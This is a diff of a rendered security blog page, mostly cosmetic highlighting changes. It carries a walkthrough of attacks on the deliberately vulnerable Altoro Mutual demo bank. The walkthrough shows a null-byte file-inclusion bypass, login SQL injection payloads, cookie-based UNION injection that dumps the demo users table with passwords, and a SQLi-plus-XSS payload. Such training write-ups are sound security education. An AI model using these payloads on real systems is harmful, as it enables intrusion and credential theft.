@@ -60,7 +60,7 @@
                            <ul class="dropdown-menu">
                                <li><a href="http://blog.dornea.nu/category/blog">
                                       <i class="icon-pencil"></i>blog
-                                      (114)</a></li>
+                                      (116)</a></li>
                                <li><a href="http://blog.dornea.nu/category/low">
                                    <i class="icon-folder-close"></i>LOW
                                       (27)</a></li>
@@ -126,7 +126,7 @@
 <h2 id="535e2de9168013bbfc31965016086243">Vulnerabilities</h2>
 <h3 id="765f6e48248fbc7c4d9648b544f5e5c6">/default.aspx?content=</h3>
 <p>There is a <strong>file inclusion vulnerability</strong> which we'll use for further investigation. URL <em><a href="http://demo.testfire.net/default.aspx?content=../testing.txt">http://demo.testfire.net/default.aspx?content=../testing.txt</a></em> will show:</p>
-<div class="highlight"><pre>An Error Has Occurred
+<div class="highlight"><pre><span></span>An Error Has Occurred
 Summary:
 Could not find file 'D:downloadsAltoroMutual_v6website  esting.txt'.
 Error Message:
@@ -136,7 +136,7 @@ System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6
 <h2 id="0b6275b4fd4340d418195012eb027c55">/bank</h2>
 <hr/>
 <p>You'll find a <strong>directory listening</strong> at <a href="http://demo.testfire.net/bank/">http://demo.testfire.net/bank/</a> which will show you a lot of information about the applications functionalities.</p>
-<div class="highlight"><pre> 5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
+<div class="highlight"><pre><span></span> 5/31/2007 11:10 AM        &lt;dir&gt; 20060308_bak
  1/12/2011 10:14 PM         1831 account.aspx
  1/12/2011 10:14 PM         4277 account.aspx.cs
  1/12/2011 10:14 PM          771 apply.aspx
@@ -163,20 +163,20 @@ System.IO.FileNotFoundException: Could not find file 'D:downloadsAltoroMutual_v6
  1/12/2011 10:14 PM           82 ws.asmx
 </pre></div>
 <p>Since the application is written in C# you might want to see whats behind the *.cs files. However clicking on the files will trigger following error message:</p>
-<div class="highlight"><pre>An Error Has Occurred
+<div class="highlight"><pre><span></span>An Error Has Occurred
 Summary:
 An unknown error occurred.
 Error Message:
 </pre></div>
 <p>So you'll have to find another way to get to the files. We'll use the <strong>file inclusion vulnerability</strong> found before to do that.</p>
 <p><a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs</a> will result in</p>
-<div class="highlight"><pre>Error! File must be of type TXT or HTM
+<div class="highlight"><pre><span></span>Error! File must be of type TXT or HTM
 </pre></div>
 <p>We'll have to bypass the filter in order to get the file. Remember the <strong>null string vulnerability</strong>? Here we go: <a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>.</p>
 <p>That will show you the content of <em>/bank/login.aspx.cs</em>. Now you can inspect the the source code to find more vulnerabilities.</p>
 <h2 id="65497bf7a464b98772b9026e8870b752">/bank/login.aspx</h2>
 <p>Here is the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/login.aspx.cs%00.txt</a>):</p>
-<div class="highlight"><pre><span class="nt">using</span> <span class="nt">System</span><span class="nc">.Data</span><span class="o">;</span>
+<div class="highlight"><pre><span></span><span class="nt">using</span> <span class="nt">System</span><span class="nc">.Data</span><span class="o">;</span>
 <span class="nt">using</span> <span class="nt">System</span><span class="nc">.Data.SqlClient</span><span class="o">;</span>
 <span class="nt">using</span> <span class="nt">System</span><span class="nc">.Data.OleDb</span><span class="o">;</span>
 <span class="nt">using</span> <span class="nt">System</span><span class="nc">.Text.RegularExpressions</span><span class="o">;</span>
@@ -191,7 +191,7 @@ Error Message:
   <span class="err">{</span>
     <span class="n">protected</span> <span class="n">void</span> <span class="n">Page_Load</span><span class="p">(</span><span class="n">object</span> <span class="n">sender</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="n">EventArgs</span> <span class="n">e</span><span class="p">)</span>
     <span class="err">{</span>
-      <span class="o">//</span> <span class="n">Put</span> <span class="n">user</span> <span class="n">code</span> <span class="n">to</span> <span class="n">initialize</span> <span class="n">the</span> <span class="k">page</span> <span class="n">here</span>
+      <span class="o">//</span> <span class="n">Put</span> <span class="n">user</span> <span class="n">code</span> <span class="n">to</span> <span class="n">initialize</span> <span class="n">the</span> <span class="nb">page</span> <span class="n">here</span>
       <span class="n">Response</span><span class="o">.</span><span class="n">Cache</span><span class="o">.</span><span class="n">SetCacheability</span><span class="p">(</span><span class="n">HttpCacheability</span><span class="o">.</span><span class="n">NoCache</span><span class="p">);</span>
       <span class="n">HtmlMeta</span> <span class="n">meta</span> <span class="o">=</span> <span class="n">new</span> <span class="n">HtmlMeta</span><span class="p">();</span>
       <span class="n">HtmlHead</span> <span class="n">head</span> <span class="o">=</span> <span class="p">(</span><span class="n">HtmlHead</span><span class="p">)</span><span class="n">Page</span><span class="o">.</span><span class="n">Header</span><span class="p">;</span>
@@ -215,7 +215,7 @@ Error Message:
     <span class="err">}</span>
     <span class="nt">protected</span> <span class="nt">string</span> <span class="nt">ValidateUser</span><span class="o">(</span><span class="nt">String</span> <span class="nt">uName</span><span class="o">,</span> <span class="nt">String</span> <span class="nt">pWord</span><span class="o">)</span>
     <span class="p">{</span>
-      <span class="o">//</span><span class="n">Set</span> <span class="k">default</span> <span class="n">status</span> <span class="n">to</span> <span class="n">Success</span>
+      <span class="o">//</span><span class="n">Set</span> <span class="nb">default</span> <span class="n">status</span> <span class="n">to</span> <span class="n">Success</span>
       <span class="n">string</span> <span class="n">status</span> <span class="o">=</span> <span class="s2">"Success"</span><span class="p">;</span>
       <span class="n">OleDbConnection</span> <span class="n">myConnection</span> <span class="o">=</span> <span class="n">new</span> <span class="n">OleDbConnection</span><span class="p">();</span>
       <span class="n">myConnection</span><span class="o">.</span><span class="n">ConnectionString</span> <span class="o">=</span> <span class="n">ConfigurationManager</span><span class="o">.</span><span class="n">ConnectionStrings</span><span class="cp">[</span><span class="s2">"DBConnStr"</span><span class="cp">]</span><span class="o">.</span><span class="n">ConnectionString</span><span class="p">;</span>
@@ -307,7 +307,7 @@ Error Message:
               <span class="n">return</span> <span class="s2">""</span><span class="p">;</span>
           <span class="p">}</span>
       <span class="err">}</span>
-    <span class="nf">#region</span> <span class="nt">Web</span> <span class="nt">Form</span> <span class="nt">Designer</span> <span class="nt">generated</span> <span class="nt">code</span>
+    <span class="nn">#region</span> <span class="nt">Web</span> <span class="nt">Form</span> <span class="nt">Designer</span> <span class="nt">generated</span> <span class="nt">code</span>
     <span class="nt">override</span> <span class="nt">protected</span> <span class="nt">void</span> <span class="nt">OnInit</span><span class="o">(</span><span class="nt">EventArgs</span> <span class="nt">e</span><span class="o">)</span>
     <span class="p">{</span>
       <span class="o">//</span>
@@ -323,21 +323,21 @@ Error Message:
     <span class="nt">private</span> <span class="nt">void</span> <span class="nt">InitializeComponent</span><span class="o">()</span>
     <span class="p">{</span>
     <span class="p">}</span>
-    <span class="nf">#endregion</span>
+    <span class="nn">#endregion</span>
   <span class="err">}</span>
 <span class="err">}</span>
 </pre></div>
 <h3 id="c6c7fb86f055418b430d443a7f425228">Brute force vulnerability</h3>
 <p>Before we investigate the code, let's have a look at a much common vulnerability. Go to <a href="http://demo.testfire.net/bank/login.aspx">http://demo.testfire.net/bank/login.aspx</a> and use a random user for the login process. You'll get:</p>
-<div class="highlight"><pre>Login Failed: We're sorry, but this username was not found in our system. Please try again.
+<div class="highlight"><pre><span></span>Login Failed: We're sorry, but this username was not found in our system. Please try again.
 </pre></div>
 <p>You could now easily <strong>bruteforce</strong> common usernames in order to login into the application. The same works with passwords too: <em>admin</em> seems to be a valid username. Try to bruteforce the password and you'll get:</p>
-<div class="highlight"><pre>Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
+<div class="highlight"><pre><span></span>Login Failed: Your password appears to be invalid. Please re-enter your password carefully.
 </pre></div>
 <p><em>admin:admin</em> is a valid username/password combination.</p>
 <h3 id="1893267eeefa97c21a09c4e6d7d15585">SQL injection using POST parameters</h3>
 <p>Now let's have a closer look at the source code... Let's analyze the <em>!ValidateUser</em>function:</p>
-<div class="highlight"><pre>protected string ValidateUser(String uName, String pWord)
+<div class="highlight"><pre><span></span>protected string ValidateUser(String uName, String pWord)
     {
       //Set default status to Success
       string status = "Success";
@@ -356,7 +356,7 @@ Error Message:
 </pre></div>
 <p>As you can see the <em>uName</em> parameter doesn't get sanitized, so you can easily run some <strong>SQL injection</strong>. Let's try that out. Using <a href="http://www.portswigger.net/burp/">Burpsuite</a> we'll tamper data sent to the web server and analyze the responses.</p>
 <p>Here's the request:</p>
-<div class="highlight"><pre>POST /bank/login.aspx HTTP/1.1
+<div class="highlight"><pre><span></span>POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -370,14 +370,14 @@ Content-Length: 39
 uid=admin%27<span class="err">&amp;</span>passw=test<span class="err">&amp;</span>btnSubmit=Login
 </pre></div>
 <p>As a response you'll get:</p>
-<div class="highlight"><pre>An Error Has Occurred
+<div class="highlight"><pre><span></span>An Error Has Occurred
 Summary:
 Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''.
 Error Message:
 System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression 'username = 'admin'' AND password = 'test''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Authentication.ValidateUser(String uName, String pWord) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 68 at Altoro.Authentication.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitanklogin.aspx.cs:line 33 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
 </pre></div>
 <p><em>Single quotes</em> are obvisouly not escaped so we could inject some SQL statements. Let's try some common ones likeÂ <strong>admin' OR 1=1;-</strong>:</p>
-<div class="highlight"><pre>POST /bank/login.aspx HTTP/1.1
+<div class="highlight"><pre><span></span>POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -391,7 +391,7 @@ Content-Length: 47
 uid=admin' OR 1=1;--<span class="err">&amp;</span>passw=test<span class="err">&amp;</span>btnSubmit=Login
 </pre></div>
 <p>The result looks very promising! We were able to login without specifying any password. All you need is a valid username. The same vulnerability applies to theÂ <em>password</em> field as well. Following request will work too:</p>
-<div class="highlight"><pre>POST /bank/login.aspx HTTP/1.1
+<div class="highlight"><pre><span></span>POST /bank/login.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -406,16 +406,16 @@ uid=admin<span class="err">&amp;</span>passw=' OR 1=1;--<span class="err">&amp;<
 </pre></div>
 <h3 id="67cf80dbb18aadf77119f4a4f5cb98ab">Base64-encoded login credentials</h3>
 <p>After a successful login the server will set a cookie <em>amUserInfo</em> which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.</p>
-<div class="highlight"><pre>amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password=dGVzdA==
+<div class="highlight"><pre><span></span>amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password=dGVzdA==
 </pre></div>
 <p>decodes to...</p>
-<div class="highlight"><pre>amUserInfo=Username=admin' OR 1=2;--&amp;Password=test
+<div class="highlight"><pre><span></span>amUserInfo=Username=admin' OR 1=2;--&amp;Password=test
 </pre></div>
 <h2 id="b972e994dc14d79d46fa4e6b52f434a8">/bank/main.aspx</h2>
 <p>After a successful login you'll be redirected to <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let's have a look at the functionalities within this page.</p>
 <h3 id="a2d31302f3ea6529e388f323038bd524">Source code disclosure&lt;</h3>
 <p>Here's the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
-<div class="highlight"><pre>using System.Collections;
+<div class="highlight"><pre><span></span>using System.Collections;
 using System.ComponentModel;
 using System.Data;
 using System.Data.OleDb;
@@ -520,7 +520,7 @@ namespace Altoro
 </pre></div>
 <h3 id="7b966d041c9c404fa4d83013a8280060">SQL injection using Cookie data</h3>
 <p>After login following request will be sent to the server:</p>
-<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
+<div class="highlight"><pre><span></span>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -531,31 +531,31 @@ Referer: http://demo.testfire.net/bank/login.aspx
 Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=1
 </pre></div>
 <p>A look at the <em>GetAccounts</em> in the source code reveals that <em>userId</em> is actually some data from the cookie <em>amUserId</em> and never gets sanitized. Let's have some fun:</p>
-<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
+<div class="highlight"><pre><span></span>GET /bank/main.aspx HTTP/1.1
 ...
 <span class="nv">amUserInfo</span><span class="o">=</span><span class="nv">UserName</span><span class="o">=</span><span class="nv">YWRtaW4</span><span class="o">=</span><span class="p">&amp;</span><span class="nv">Password</span><span class="o">=</span><span class="nv">YWRtaW4</span><span class="o">=</span><span class="p">;</span> <span class="nv">amUserId</span><span class="o">=</span>1<span class="err">'</span>
 </pre></div>
 <p><em>amUserId</em> was changed and the whole GET request was sent again to the server. The response was quite informative:</p>
-<div class="highlight"><pre>An Error Has Occurred
+<div class="highlight"><pre><span></span>An Error Has Occurred
 Summary:
 Syntax error in string in query expression 'userid = 1''.
 Error Message:
 System.Data.OleDb.OleDbException: Syntax error in string in query expression 'userid = 1''. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
 </pre></div>
 <p>Ahhh, there we go! <strong>Another SQL injection vulnerability!</strong> You could now dump some data:</p>
-<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
+<div class="highlight"><pre><span></span>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
 amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select accountid, acct_type from accounts;--
 </pre></div>
 <p>You could use this vulnerability to <strong>dump the <em>users</em> table</strong>:</p>
-<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
+<div class="highlight"><pre><span></span>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
 amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select username, password from users;--
 </pre></div>
 <p>This will return:</p>
-<div class="highlight"><pre>admin admin
+<div class="highlight"><pre><span></span>admin admin
 cclay Ali
 jsmith Demo1234
 sjoe frazier
@@ -565,10 +565,10 @@ tuser tuser
 <p>Simple, isn't it?</p>
 <h3 id="126fccae2356602cff581a01152f34e7">XSS using cookie data</h3>
 <p>Alternatively you could combine SQLi with XSS:</p>
-<div class="highlight"><pre>GET /bank/main.aspx HTTP/1.1
+<div class="highlight"><pre><span></span>GET /bank/main.aspx HTTP/1.1
 Host: demo.testfire.net
 ...
-amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select "<span class="nt">&lt;script&gt;</span><span class="p">...</span><span class="nt">&lt;/script&gt;</span>", "Injection FOUND!" from accounts;--
+amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select "<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;...&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>", "Injection FOUND!" from accounts;--
 </pre></div>
                 </div>
 <hr/>
@@ -611,7 +611,7 @@ amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUs
                     <div class="niu2-sidebar-label"><i class="icon-tag"></i>Tag:</div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/hacking/">hacking</a><sup>22</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/security/">security</a><sup>35</sup></div>
-                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>13</sup></div>
+                    <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/wargames/">wargames</a><sup>15</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/web/">web</a><sup>14</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/appsec/">appsec</a><sup>25</sup></div>
                     <div class="niu2-sidebar-inter-value niu2-sidebar-tag"><a href="http://blog.dornea.nu/tag/xss/">xss</a><sup>5</sup></div>
